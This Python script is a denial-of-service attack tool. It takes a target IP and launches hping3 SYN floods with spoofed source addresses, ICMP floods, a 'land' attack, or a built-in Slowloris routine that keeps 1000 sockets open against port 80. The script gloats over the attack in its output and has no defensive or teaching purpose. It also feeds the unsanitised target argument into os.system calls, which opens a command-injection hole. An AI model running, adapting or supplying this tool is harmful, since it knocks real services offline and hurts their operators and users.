import datetime
import os
import sys
import socket
import random
import time
import argparse

# Global parameters
ERROR_BAD_ARGV_FROM_USER = '[DDoS] Error, incorrect arguments: '
INFO_INIT_1 = '[DDoS] Starting the attack on the given IP '
INFO_INIT_2 = '(Press CTRL+C to stop me)...'
INFO_STATS = '[DDoS] Quitting, showing stats:'
ATTACK_FIN = '[DDoS] Completed the attack  >:D'
PKTS_CADENCE = 100
PKTS_LEN = 1442
DATA_LEN = 1000000
DATA_STR = 'MB'
INIT_WAIT = 1

def parse_arguments():
		parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
		parser.add_argument('--ddos', type=str, help="tcp, icmp or slowloris", required=True)
		parser.add_argument('--ip', type=str, help="IP", required=True)
		return parser.parse_args()

# Get the current time 
def get_str_time():
	return '[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']'

# Get the time difference based on global variables
def diff():
	return datetime.datetime.now() - time_init

# Prepare the stats
def stats():
	return '[+] Time Elapsed: ' + str(diff()) + '\n' + '[+] Data sent: ' + str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n'

#Slowloris
def slowloris():
	try:
		global allthesockets
		headers = [
			"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Accept-language: en-US,en,q=0.5",
			"Connection: Keep-Alive"
		]
		howmany_sockets = 1000
		port = 80
		allthesockets = []
		print("Creating sockets...")
		for k in range(howmany_sockets):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(40)
				s.connect((args.ip, port))
				allthesockets.append(s)
			except Exception as e:
				print(e)
		print(range(howmany_sockets)," sockets are ready.")
		num = 0
		for r in allthesockets:
			print("[",num,"]")
			num += 1 
			r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
			print("Successfully sent [+] GET /? HTTP /1.1 ...")
			for header in headers:
				r.send(bytes("{}\r\n".format(header).encode("utf-8")))
			print("Successfully sent [+] Headers ...")

		while True:
			for v in allthesockets:
				try:
					v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
					print("[-][-][*] Waiter sent.")
				except:
					print("[-] A socket failed, reattempting...")
					allthesockets.remove(v)
					try:
						v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						v.settimeout(4)
						v.connect((args.ip,port))
						v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
						for header in headers:
							v.send(bytes("{}\r\n".format(header).encode("utf-8")))
					except:
						pass

			print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
			print("Sleeping off ...")
			time.sleep(1)
		
	except ConnectionRefusedError:
		print("[-] Connection refused, retrying...")
		slowloris()

if __name__ == "__main__":	
	args = parse_arguments()

	# Initialize status variables
	time_init = datetime.datetime.now()
	
	# Tell the user how he/she can stop the attack
	print(INFO_INIT_1 + args.ip + ' ' + INFO_INIT_2)
	os.system('sleep ' + str(INIT_WAIT))

	# hping3 for TCP DDoS
	if args.ddos == 'tcp':
		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster --rand-source ' + args.ip)
	# hping3 for ICMP DDoS
	if args.ddos == 'icmp':
		os.system('hping3 -V -1 -d 1400 --faster ' + args.ip)
	# hping3 for TCP Land Attack
	if args.ddos == 'land':
		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster -a ' + args.ip + args.ip)
    #Slowloris
	if args.ddos == 'slowloris':
		while(True):
			slowloris()
		
    
	# Show the stats
	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
	print(get_str_time() + ATTACK_FIN)
    
    
